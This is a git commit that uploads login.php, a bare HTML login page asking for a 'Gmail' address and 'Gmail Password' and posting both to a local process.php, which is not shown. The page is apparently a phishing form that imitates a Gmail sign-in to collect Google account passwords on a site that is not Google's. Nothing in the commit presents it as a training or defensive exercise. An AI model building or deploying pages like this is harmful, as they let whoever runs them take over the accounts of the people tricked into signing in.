35287322e0894f7136fa9a27c2d37832f430f252
proggames <63907862+proggames@users.noreply.github.com>
2020-05-02 05:47:42 -0500

    Add files via upload

---
+++ login.php
@@ -0,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Log In</title>
+	 <link rel="stylesheet" href="styles.css">
+</head>
+<body style="background-image:url('download.jpg')">
+	<div align="center">
+		<form action = "process.php" method="post">
+			<p style="font-size: 20px">Gmail: </p><input type="text" name="id">
+			<p style="font-size: 20px">Gmail Password: </p> <input type="password" name="pd">
+			<input type="submit" value="Log in">
+		</form>
+	</div>
+</body>
+</html>
